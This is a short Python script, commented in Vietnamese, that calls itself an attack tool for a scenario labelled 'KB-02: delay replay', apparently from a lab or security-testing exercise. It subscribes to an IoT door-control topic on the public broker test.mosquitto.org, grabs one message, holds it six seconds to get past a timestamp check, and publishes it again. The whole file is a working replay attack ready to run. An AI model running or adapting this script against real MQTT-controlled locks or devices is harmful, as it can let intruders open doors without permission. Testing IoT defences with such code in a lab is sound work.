
import paho.mqtt.client as mqtt
import json
import time

BROKER = "test.mosquitto.org"
PORT = 1883
TOPIC = "iot/door/control"
attack_done = False

def on_message(client, userdata, msg):
    global attack_done
    if attack_done: return
        
    payload = msg.payload.decode()
    print(f"\n[!!!] Đã bắt được gói tin: {payload}")
    print("[*] (KB-02) Đang giữ gói tin và chờ 6 giây để vượt mốc Timestamp...")
    time.sleep(6)
    
    print("[=>] BẮT ĐẦU PHÁT LẠI GÓI TIN (DELAY REPLAY)...")
    client.publish(TOPIC, payload)
    attack_done = True
    time.sleep(1)
    client.disconnect()

client = mqtt.Client()
client.on_message = on_message
client.connect(BROKER, PORT, 60)
client.subscribe(TOPIC)
print("--- KHỞI ĐỘNG CÔNG CỤ TẤN CÔNG (KB-02: DELAY REPLAY) ---")
client.loop_forever()
